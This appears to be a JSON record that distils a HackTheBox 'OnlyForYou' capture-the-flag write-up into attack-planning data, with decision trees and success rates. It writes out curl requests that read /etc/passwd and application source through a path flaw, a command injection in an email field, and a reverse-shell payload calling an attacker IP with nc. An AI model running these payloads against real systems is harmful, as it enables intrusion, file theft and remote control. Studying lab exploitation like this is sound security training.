@@ -1,0 +1,977 @@
+{
+  "writeup_id": "Htb_Onlyforyou",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_flask_lfi_to_cypher_injection",
+    "primary_services": [
+      "http",
+      "ssh",
+      "neo4j"
+    ],
+    "port_signature": "22+80",
+    "service_combination": "ssh+nginx+flask",
+    "os_family": "linux",
+    "environment_type": "web_application",
+    "entry_vector": "local_file_inclusion",
+    "privilege_path": "www-data_to_user_to_root",
+    "attack_complexity": "medium",
+    "estimated_time": "90-120 minutes",
+    "scenario_confidence": 0.88,
+    "distinguishing_factors": [
+      "flask_os_path_join_vulnerability",
+      "python_re_match_bypass",
+      "neo4j_cypher_injection",
+      "pip_sudo_privilege_escalation"
+    ],
+    "environmental_clues": [
+      "subdomain_enumeration_required",
+      "source_code_disclosure",
+      "file_upload_functionality",
+      "graph_database_backend"
+    ],
+    "similar_scenarios": [
+      "flask_lfi_boxes",
+      "python_web_exploitation"
+    ],
+    "unique_aspects": [
+      "os_path_join_misunderstanding",
+      "re_match_filter_bypass",
+      "neo4j_database_exploitation",
+      "multi_stage_python_exploitation"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "os.path.join_bypass",
+        "success_reason": "Python os.path.join treats absolute paths as root, ignoring previous components",
+        "prerequisite_indicators": [
+          "python_flask_application",
+          "file_download_functionality",
+          "path_traversal_protection_present"
+        ],
+        "recognition_patterns": [
+          "os.path.join() used for path construction",
+          "directory traversal filters check for '../'",
+          "absolute path not filtered",
+          "send_file() or similar file serving function"
+        ],
+        "failure_modes": [
+          "absolute_paths_filtered",
+          "proper_path_validation",
+          "chroot_environment",
+          "whitelist_based_filtering"
+        ],
+        "environmental_factors": [
+          "python_web_application",
+          "developer_misunderstanding_of_os_path_join",
+          "incomplete_security_controls"
+        ],
+        "success_probability": 0.92,
+        "typical_timeframe": "2-5 minutes"
+      },
+      {
+        "technique": "source_code_disclosure",
+        "success_reason": "Application provided source code download feature",
+        "prerequisite_indicators": [
+          "source_code_download_button",
+          "development_environment",
+          "beta_subdomain_exists"
+        ],
+        "recognition_patterns": [
+          "source code download links",
+          "zip file downloads",
+          "development/beta environments",
+          "flask application structure"
+        ],
+        "failure_modes": [
+          "no_source_disclosure",
+          "obfuscated_code",
+          "production_environment"
+        ],
+        "environmental_factors": [
+          "development_practices",
+          "beta_testing_environment",
+          "insufficient_production_hardening"
+        ],
+        "success_probability": 0.95,
+        "typical_timeframe": "1-2 minutes"
+      },
+      {
+        "technique": "regex_bypass_command_injection",
+        "success_reason": "re.match() only checks beginning of string, allowing bypass with newlines",
+        "prerequisite_indicators": [
+          "command_execution_functionality",
+          "regex_input_validation",
+          "python_re_module_usage"
+        ],
+        "recognition_patterns": [
+          "re.match() instead of re.fullmatch()",
+          "command injection points",
+          "input validation bypasses",
+          "newline character acceptance"
+        ],
+        "failure_modes": [
+          "proper_regex_anchoring",
+          "re_fullmatch_usage",
+          "input_sanitization",
+          "command_parameterization"
+        ],
+        "environmental_factors": [
+          "developer_regex_misunderstanding",
+          "insufficient_input_validation",
+          "direct_command_execution"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "cypher_injection",
+        "success_reason": "Neo4J Cypher queries constructed with string concatenation",
+        "prerequisite_indicators": [
+          "neo4j_database_present",
+          "user_input_in_queries",
+          "graph_database_functionality"
+        ],
+        "recognition_patterns": [
+          "neo4j service running",
+          "cypher query construction",
+          "string concatenation in queries",
+          "graph database interactions"
+        ],
+        "failure_modes": [
+          "parameterized_queries",
+          "input_sanitization",
+          "query_builder_usage",
+          "database_permissions_restricted"
+        ],
+        "environmental_factors": [
+          "neo4j_default_configuration",
+          "insecure_query_construction",
+          "database_integration"
+        ],
+        "success_probability": 0.78,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "sudo_pip_privilege_escalation",
+        "success_reason": "Unsafe sudo rule allowing pip with arbitrary arguments",
+        "prerequisite_indicators": [
+          "sudo_permissions_present",
+          "pip_sudo_access",
+          "python_package_management"
+        ],
+        "recognition_patterns": [
+          "sudo -l shows pip permissions",
+          "package installation capabilities",
+          "python development environment",
+          "unrestricted pip arguments"
+        ],
+        "failure_modes": [
+          "restricted_pip_arguments",
+          "no_sudo_permissions",
+          "pip_not_available",
+          "argument_filtering"
+        ],
+        "environmental_factors": [
+          "development_environment_privileges",
+          "python_development_setup",
+          "insufficient_sudo_restrictions"
+        ],
+        "success_probability": 0.9,
+        "typical_timeframe": "5-10 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "source code download functionality",
+        "discovery_method": "website enumeration and source code button",
+        "why_critical": "Revealed application logic and multiple vulnerabilities",
+        "how_to_recognize": [
+          "beta/development environments",
+          "source code download links",
+          "zip file downloads",
+          "flask application indicators"
+        ],
+        "follow_up_actions": [
+          "analyze_source_for_vulnerabilities",
+          "identify_file_paths",
+          "map_application_logic",
+          "find_injection_points"
+        ]
+      },
+      {
+        "discovery": "os.path.join vulnerability in download function",
+        "discovery_method": "source code analysis of /download route",
+        "why_critical": "Enabled arbitrary file read leading to further enumeration",
+        "how_to_recognize": [
+          "os.path.join usage with user input",
+          "incomplete path traversal protection",
+          "absolute path not filtered",
+          "file serving functionality"
+        ],
+        "follow_up_actions": [
+          "read_system_files",
+          "enumerate_application_files",
+          "find_configuration_files",
+          "locate_other_applications"
+        ]
+      },
+      {
+        "discovery": "neo4j service and credentials",
+        "discovery_method": "file system enumeration via path traversal",
+        "why_critical": "Provided database access and user enumeration capabilities",
+        "how_to_recognize": [
+          "neo4j process running",
+          "database configuration files",
+          "graph database ports",
+          "cypher query interfaces"
+        ],
+        "follow_up_actions": [
+          "test_database_connection",
+          "enumerate_database_contents",
+          "identify_injection_points",
+          "extract_user_credentials"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "www-data",
+        "escalation_method": "cypher_injection_to_user_credentials",
+        "why_possible": "Neo4J Cypher injection allowed credential extraction",
+        "recognition_signs": [
+          "neo4j_database_accessible",
+          "user_input_in_cypher_queries",
+          "string_concatenation_in_queries",
+          "password_hashes_in_database"
+        ],
+        "exploitation_path": "File Read → Neo4J Access → Cypher Injection → Password Hash → User Shell"
+      },
+      {
+        "privilege_level": "user",
+        "escalation_method": "sudo_pip_to_root",
+        "why_possible": "Unrestricted sudo access to pip allowing arbitrary code execution",
+        "recognition_signs": [
+          "sudo_l_shows_pip_access",
+          "no_argument_restrictions",
+          "python_development_environment",
+          "pip_installation_capabilities"
+        ],
+        "exploitation_path": "User Access → sudo pip → Malicious Package → Root Shell"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found only ports 22 (SSH) and 80 (HTTP) open on Linux host",
+        "decision": "Focus on web application enumeration and subdomain discovery",
+        "reasoning": "Limited attack surface requires thorough web app analysis",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "ssh_enumeration",
+            "when": "if credentials found"
+          },
+          {
+            "option": "service_version_exploits",
+            "when": "if vulnerable versions identified"
+          }
+        ],
+        "success_indicators": [
+          "subdomains_discovered",
+          "web_technologies_identified",
+          "source_code_available"
+        ],
+        "next_decision": "analyze_web_applications"
+      },
+      {
+        "step": 2,
+        "situation": "Discovered subdomain with source code available",
+        "decision": "Download and analyze source code for vulnerabilities",
+        "reasoning": "Source code analysis provides direct path to finding exploitable flaws",
+        "confidence": 0.95,
+        "prerequisites": [
+          "source_code_accessible"
+        ],
+        "success_indicators": [
+          "vulnerable_functions_identified",
+          "file_paths_discovered"
+        ],
+        "failure_fallbacks": [
+          "directory_bruteforce",
+          "parameter_fuzzing"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Found os.path.join usage in file download function",
+        "decision": "Test for absolute path injection vulnerability",
+        "reasoning": "os.path.join ignores previous components when absolute path provided",
+        "confidence": 0.85,
+        "prerequisites": [
+          "download_endpoint_identified",
+          "parameter_control"
+        ],
+        "success_indicators": [
+          "arbitrary_file_read_achieved"
+        ],
+        "failure_fallbacks": [
+          "directory_traversal_attempts",
+          "parameter_pollution"
+        ]
+      },
+      {
+        "step": 4,
+        "situation": "Achieved arbitrary file read via path injection",
+        "decision": "Enumerate nginx config and find main application source",
+        "reasoning": "Web server config reveals application locations and architecture",
+        "confidence": 0.9,
+        "prerequisites": [
+          "file_read_capability"
+        ],
+        "success_indicators": [
+          "main_app_source_found",
+          "additional_endpoints_discovered"
+        ],
+        "failure_fallbacks": [
+          "common_file_enumeration",
+          "log_file_analysis"
+        ]
+      },
+      {
+        "step": 5,
+        "situation": "Found command injection in form processing with regex filtering",
+        "decision": "Bypass re.match filtering using newline injection",
+        "reasoning": "re.match only matches from string beginning, newlines can bypass",
+        "confidence": 0.8,
+        "prerequisites": [
+          "command_injection_point_identified",
+          "filtering_mechanism_understood"
+        ],
+        "success_indicators": [
+          "command_execution_achieved",
+          "reverse_shell_obtained"
+        ],
+        "failure_fallbacks": [
+          "alternative_injection_methods",
+          "filter_bypass_techniques"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_source_code_available": {
+        "action": "prioritize_source_analysis_over_blackbox",
+        "tools": [
+          "code_review",
+          "static_analysis"
+        ],
+        "next_phase": "identify_vulnerable_functions"
+      },
+      "if_file_read_achieved": {
+        "action": "enumerate_system_configuration",
+        "targets": [
+          "/etc/nginx/sites-enabled/default",
+          "/etc/passwd",
+          "application_source_files"
+        ],
+        "purpose": "map_application_architecture"
+      },
+      "if_command_injection_found": {
+        "action": "analyze_filtering_mechanisms",
+        "approach": "understand_regex_limitations",
+        "tools": [
+          "manual_testing",
+          "payload_crafting"
+        ]
+      },
+      "if_initial_shell_obtained": {
+        "action": "enumerate_for_privilege_escalation",
+        "focus": [
+          "database_services",
+          "sudo_permissions",
+          "suid_binaries"
+        ],
+        "tools": [
+          "linpeas",
+          "manual_enumeration"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_os_path_join_usage_for_absolute_path_injection",
+        "reasoning": "common_python_vulnerability_with_high_success_rate",
+        "applicability": "python_flask_applications"
+      },
+      {
+        "rule": "analyze_regex_match_vs_search_for_bypass_opportunities",
+        "reasoning": "re_match_only_checks_string_beginning_allowing_newline_bypass",
+        "applicability": "input_validation_with_regex"
+      },
+      {
+        "rule": "prioritize_source_code_analysis_when_available",
+        "reasoning": "direct_vulnerability_identification_more_efficient_than_blackbox",
+        "applicability": "open_source_or_leaked_code_scenarios"
+      },
+      {
+        "rule": "enumerate_web_server_configs_after_file_read",
+        "reasoning": "reveals_application_architecture_and_additional_attack_surface",
+        "applicability": "arbitrary_file_read_vulnerabilities"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Flask Path Traversal",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "flask_application_detected",
+          "file_download_functionality",
+          "os_path_join_misuse"
+        ],
+        "success_indicators": [
+          "file_contents_returned",
+          "directory_traversal_successful",
+          "source_code_accessible"
+        ],
+        "incompatible_with": [
+          "proper_path_sanitization",
+          "chroot_jail",
+          "strict_file_permissions"
+        ],
+        "confidence_boosters": [
+          "python_flask_framework",
+          "download_endpoint_exists",
+          "file_parameter_in_requests"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "Command Injection via Regex Bypass",
+        "mitre_id": "T1059.004",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "user_input_processed",
+          "system_command_execution",
+          "regex_filtering_present",
+          "re_match_instead_of_fullmatch"
+        ],
+        "success_indicators": [
+          "command_output_returned",
+          "reverse_shell_established",
+          "system_access_gained"
+        ],
+        "incompatible_with": [
+          "proper_input_sanitization",
+          "command_execution_disabled",
+          "strict_regex_validation"
+        ],
+        "confidence_boosters": [
+          "image_processing_functionality",
+          "file_conversion_features",
+          "python_subprocess_usage"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "15-45 minutes"
+      },
+      {
+        "technique": "Neo4j Cypher Injection",
+        "mitre_id": "T1190",
+        "required_services": [
+          "neo4j",
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          7474,
+          7687,
+          80,
+          443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "neo4j_database_present",
+          "cypher_query_construction",
+          "user_input_in_queries",
+          "insufficient_parameterization"
+        ],
+        "success_indicators": [
+          "database_data_extracted",
+          "authentication_bypassed",
+          "sensitive_information_disclosed"
+        ],
+        "incompatible_with": [
+          "parameterized_queries",
+          "input_validation",
+          "database_access_restrictions"
+        ],
+        "confidence_boosters": [
+          "graph_database_functionality",
+          "user_management_features",
+          "search_functionality"
+        ],
+        "typical_success_rate": 0.7,
+        "estimated_time": "20-60 minutes"
+      },
+      {
+        "technique": "Sudo Pip Privilege Escalation",
+        "mitre_id": "T1548.003",
+        "required_services": [],
+        "required_ports": [],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "sudo_access_to_pip",
+          "python_pip_installed",
+          "user_shell_access"
+        ],
+        "success_indicators": [
+          "root_shell_obtained",
+          "privilege_escalation_successful",
+          "system_compromise_achieved"
+        ],
+        "incompatible_with": [
+          "restricted_sudo_environment",
+          "pip_disabled",
+          "no_sudo_access"
+        ],
+        "confidence_boosters": [
+          "development_environment",
+          "python_applications_present",
+          "loose_sudo_configuration"
+        ],
+        "typical_success_rate": 0.9,
+        "estimated_time": "5-15 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "flask_application": {
+        "port_indicators": [
+          80,
+          443,
+          5000,
+          8080
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "Flask",
+          "Werkzeug",
+          "Python"
+        ],
+        "technology_indicators": [
+          "flask",
+          "python",
+          "jinja2"
+        ],
+        "confidence_threshold": 0.8
+      },
+      "neo4j_database": {
+        "port_indicators": [
+          7474,
+          7687
+        ],
+        "service_indicators": [
+          "neo4j",
+          "bolt"
+        ],
+        "banner_indicators": [
+          "Neo4j",
+          "Cypher"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "linux_system": {
+        "port_indicators": [
+          22
+        ],
+        "service_indicators": [
+          "ssh",
+          "openssh"
+        ],
+        "banner_indicators": [
+          "Ubuntu",
+          "OpenSSH"
+        ],
+        "confidence_threshold": 0.9
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "flask_path_traversal",
+          "when": "flask_application_detected_with_file_operations",
+          "reason": "often_leads_to_source_code_disclosure_and_further_vulnerabilities"
+        },
+        {
+          "attack": "sudo_pip_privilege_escalation",
+          "when": "user_shell_access_and_python_environment",
+          "reason": "very_high_success_rate_quick_root_access"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "command_injection_regex_bypass",
+          "when": "file_processing_functionality_detected",
+          "reason": "common_in_image_processing_applications"
+        },
+        {
+          "attack": "neo4j_cypher_injection",
+          "when": "graph_database_functionality_present",
+          "reason": "effective_for_data_extraction_and_authentication_bypass"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Python os.path.join Directory Traversal",
+        "mitre_id": "T1083",
+        "category": "discovery",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "Burp Suite",
+            "command_template": "POST /download HTTP/1.1\nHost: {target}\nContent-Type: application/x-www-form-urlencoded\n\nimage={absolute_path}",
+            "actual_command": "POST /download HTTP/1.1\nHost: beta.only4you.htb\nContent-Type: application/x-www-form-urlencoded\n\nimage=/etc/passwd",
+            "output_pattern": "File contents returned as attachment",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          }
+        ],
+        "prerequisites": [
+          "flask_application_with_os_path_join",
+          "file_download_endpoint",
+          "insufficient_path_validation"
+        ],
+        "success_indicators": [
+          "system_files_readable",
+          "application_source_code_accessible",
+          "configuration_files_exposed"
+        ],
+        "common_failures": [
+          "proper_path_validation_implemented",
+          "chroot_jail_restrictions",
+          "file_permissions_blocking_access"
+        ],
+        "follow_up_techniques": [
+          "source_code_analysis",
+          "configuration_file_enumeration",
+          "credential_harvesting"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Python re.match Bypass for Command Injection",
+        "mitre_id": "T1059.006",
+        "category": "execution",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl -X POST {target} -d 'email={valid_email_prefix};{command}&subject={subject}&message={message}'",
+            "actual_command": "curl -X POST http://only4you.htb/ -d 'email=test@example.com;whoami&subject=test&message=test'",
+            "output_pattern": "Command executed in subprocess.run call",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "python_re_match_validation",
+          "subprocess_call_with_user_input",
+          "shell_true_parameter"
+        ],
+        "success_indicators": [
+          "command_execution_successful",
+          "reverse_shell_established",
+          "system_information_gathered"
+        ],
+        "common_failures": [
+          "proper_regex_anchoring_with_dollar_sign",
+          "input_sanitization_implemented",
+          "subprocess_shell_false"
+        ],
+        "follow_up_techniques": [
+          "reverse_shell_establishment",
+          "privilege_escalation_enumeration",
+          "lateral_movement"
+        ],
+        "time_investment": "10-30 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Subdomain Enumeration",
+        "mitre_id": "T1590.002",
+        "category": "reconnaissance",
+        "phase": "reconnaissance",
+        "tools_used": [
+          {
+            "name": "ffuf",
+            "command_template": "ffuf -u http://{domain} -H 'Host: FUZZ.{domain}' -ac -mc all -w {wordlist}",
+            "actual_command": "ffuf -u http://only4you.htb -H 'Host: FUZZ.only4you.htb' -ac -mc all -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt",
+            "output_pattern": "Status: 200, Size: {size}, Words: {words}",
+            "effectiveness_rating": 4,
+            "reliability": 0.9
+          }
+        ],
+        "prerequisites": [
+          "domain_name_identified",
+          "virtual_host_routing_in_use",
+          "wordlist_available"
+        ],
+        "success_indicators": [
+          "additional_subdomains_discovered",
+          "different_response_sizes_found",
+          "new_attack_surface_identified"
+        ],
+        "common_failures": [
+          "no_virtual_hosts_configured",
+          "rate_limiting_blocking_requests",
+          "insufficient_wordlist_coverage"
+        ],
+        "follow_up_techniques": [
+          "subdomain_content_analysis",
+          "technology_stack_identification",
+          "vulnerability_assessment"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "ffuf",
+        "use_case": "subdomain_enumeration",
+        "effectiveness_rating": 4,
+        "reliability": 0.9,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_reconnaissance"
+        ],
+        "alternatives": [
+          "gobuster",
+          "wfuzz",
+          "dirbuster"
+        ],
+        "best_practices": [
+          "use_auto_calibration_with_ac_flag",
+          "match_all_status_codes_initially",
+          "use_comprehensive_wordlists"
+        ]
+      },
+      {
+        "tool": "Burp Suite",
+        "use_case": "file_disclosure_exploitation",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "medium",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "curl",
+          "wget",
+          "custom_scripts"
+        ],
+        "best_practices": [
+          "use_repeater_for_payload_testing",
+          "intercept_and_modify_requests",
+          "analyze_response_patterns"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "flask_path_traversal_to_source_disclosure",
+        "steps": [
+          {
+            "step": 1,
+            "command": "ffuf -u http://only4you.htb -H 'Host: FUZZ.only4you.htb' -ac -mc all -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt",
+            "purpose": "Discover subdomains",
+            "expected_output": "beta.only4you.htb found"
+          },
+          {
+            "step": 2,
+            "command": "curl -X POST http://beta.only4you.htb/download -d 'image=/etc/passwd'",
+            "purpose": "Test path traversal vulnerability",
+            "expected_output": "System passwd file contents"
+          },
+          {
+            "step": 3,
+            "command": "curl -X POST http://beta.only4you.htb/download -d 'image=/etc/nginx/sites-enabled/default'",
+            "purpose": "Enumerate web server configuration",
+            "expected_output": "Nginx virtual host configuration"
+          },
+          {
+            "step": 4,
+            "command": "curl -X POST http://beta.only4you.htb/download -d 'image=/var/www/only4you.htb/app.py'",
+            "purpose": "Extract main application source code",
+            "expected_output": "Flask application source code"
+          },
+          {
+            "step": 5,
+            "command": "curl -X POST http://beta.only4you.htb/download -d 'image=/var/www/only4you.htb/form.py'",
+            "purpose": "Extract vulnerable form handling code",
+            "expected_output": "Python code with subprocess call"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "15-25 minutes"
+      },
+      {
+        "sequence_name": "re_match_bypass_to_command_injection",
+        "steps": [
+          {
+            "step": 1,
+            "command": "curl -X POST http://only4you.htb/ -d 'email=test@example.com;whoami&subject=test&message=test'",
+            "purpose": "Test command injection via email parameter",
+            "expected_output": "Command executed in dig subprocess call"
+          },
+          {
+            "step": 2,
+            "command": "curl -X POST http://only4you.htb/ -d 'email=test@example.com;nc -e /bin/bash {attacker_ip} {port}&subject=test&message=test'",
+            "purpose": "Establish reverse shell",
+            "expected_output": "Reverse shell connection established"
+          }
+        ],
+        "success_rate": 0.88,
+        "typical_duration": "10-20 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "OnlyForYou",
+      "difficulty": "Medium",
+      "os": "Ubuntu 20.04",
+      "platform": "HackTheBox",
+      "release_date": "2023-04-22",
+      "author": "0xM4hm0ud",
+      "estimated_time": "2-3 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "web_application",
+        "code_injection",
+        "database_injection"
+      ],
+      "key_vulnerabilities": [
+        "path_traversal",
+        "command_injection",
+        "cypher_injection",
+        "sudo_misconfiguration"
+      ],
+      "environment_type": "web_application_server",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "python_security_flaws",
+        "neo4j_injection",
+        "regex_bypass",
+        "privilege_escalation"
+      ],
+      "prerequisite_knowledge": [
+        "python_programming",
+        "web_application_security",
+        "linux_fundamentals",
+        "database_concepts"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_application",
+      "subcategories": [
+        "code_injection",
+        "database_injection",
+        "privilege_escalation"
+      ],
+      "attack_types": [
+        "initial_access",
+        "lateral_movement",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "secure_coding_practices",
+        "input_validation",
+        "sudo_hardening",
+        "database_security"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Bolt",
+        "Shoppy",
+        "Pandora"
+      ],
+      "similarity_reasons": [
+        "web_application_focus",
+        "code_injection",
+        "multi_stage_exploitation"
+      ],
+      "unique_aspects": [
+        "neo4j_cypher_injection",
+        "os_path_join_vulnerability",
+        "re_match_bypass"
+      ],
+      "difficulty_factors": [
+        "multiple_injection_types",
+        "python_specific_vulnerabilities",
+        "complex_attack_chain"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T13:10:42.335140",
+    "original_file": "0xdf_writeups/Htb Onlyforyou.md",
+    "content_length": 35377,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
